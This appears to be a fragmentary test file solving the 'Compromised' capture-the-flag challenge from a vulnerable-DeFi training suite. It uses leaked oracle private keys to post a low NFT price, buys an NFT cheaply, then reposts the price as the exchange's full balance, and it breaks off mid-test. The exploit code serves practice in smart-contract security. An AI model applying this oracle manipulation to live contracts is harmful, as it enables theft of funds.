...
describe("Compromised challenge", function () {
  ...
  before(async function () {
    ...
    // CHANGED DUE TO ERROR: The max upfront cost is
  ...
  it("Exploit", async function () {
    ...
    const publicKeys = privateKeys.map((hexValues) => {
      return ethers.utils.computeAddress(hexValues);
    });
    console.log(" ");
    ...
    let sourceWallets = privateKeys.map((keys) => {
      return new ethers.Wallet(keys, ethers.provider);
    });

    for (const wallet of sourceWallets) {
      console.log("Price BF: ", (await this.oracle.getPriceBySource("DVNFT", wallet.address)).toString());
      await this.oracle.connect(wallet).postPrice("DVNFT", ethers.utils.parseEther("0.05"));      
      console.log("Price AF: ", (await this.oracle.getPriceBySource("DVNFT", wallet.address)).toString());
    }

    let oracleNFTPrice = ethers.utils.formatEther(await this.oracle.connect(attacker).getMedianPrice("DVNFT"));

    console.log("oracleNFTPrice: ", oracleNFTPrice.toString());
    console.log("attacker bal ", (await ethers.provider.getBalance(attacker.address)).toString());
    await this.exchange.connect(attacker).buyOne({ value: ethers.utils.parseEther("0.1") });
        
    const exchangeAmount = await ethers.provider.getBalance(this.exchange.address);

    for (const wallet of sourceWallets) {
      await this.oracle.connect(wallet).postPrice("DVNFT", exchangeAmount);
    }

    console.log("bal attacker nft: ", (await this.nftToken.balanceOf(attacker.address)).toString());
